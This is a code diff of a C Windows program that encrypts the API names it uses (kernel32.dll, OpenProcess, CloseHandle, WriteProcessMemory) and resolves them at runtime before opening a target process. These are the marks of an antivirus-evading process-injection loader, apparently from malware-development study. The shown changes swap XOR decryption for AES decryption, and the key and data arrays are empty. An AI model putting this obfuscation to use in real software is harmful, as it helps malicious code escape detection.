@@ -30,6 +30,7 @@ unsigned char s_ct32s[] = { };
 
 // decrypted functions
 char func_op[12] = "";
+char func_clh[12] = "";
 
 // encrypted kernel32.dll
 unsigned char s_k32[] = { };
@@ -56,7 +57,7 @@ char s_cth_key[] = "";
 char s_wfso_key[] = "";
 char s_wpm_key[] = "";
 unsigned char s_op_key[] = "";
-char s_clh_key[] = "";
+unsigned char s_clh_key[] = "";
 char s_p32f_key[] = "";
 char s_p32n_key[] = "";
 char s_ct32s_key[] = "";
@@ -207,8 +208,11 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     XOR((char *) s_k32, s_k32_len, k32_key, sizeof(k32_key));
 
     // decrypt CloseHandle function call
-    XOR((char *) s_clh, s_clh_len, s_clh_key, sizeof(s_clh_key));
-    pCloseHandle = GetProcAddress(GetModuleHandle(s_k32), s_clh);
+    // XOR((char *) s_clh, s_clh_len, s_clh_key, sizeof(s_clh_key));
+
+    AESDecrypt((char *)s_clh, s_clh_len, s_clh_key, sizeof(s_clh_key));
+    snprintf(func_clh, sizeof(func_clh), "%s", s_clh);
+    pCloseHandle = GetProcAddress(GetModuleHandle(s_k32), "CloseHandle"); //,func_clh);
 
     // decrypt process name
     XOR((char *) my_proc, my_proc_len, my_proc_key, sizeof(my_proc_key));
@@ -218,6 +222,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     if (pid) {
         // decrypt OpenProcess function call
         AESDecrypt((char *)s_op, s_op_len, s_op_key, sizeof(s_op_key));
+        snprintf(func_op, sizeof(func_op), "%s", s_op);
         pOpenProcess = GetProcAddress(GetModuleHandle(s_k32), func_op);
 
         // try to open target process
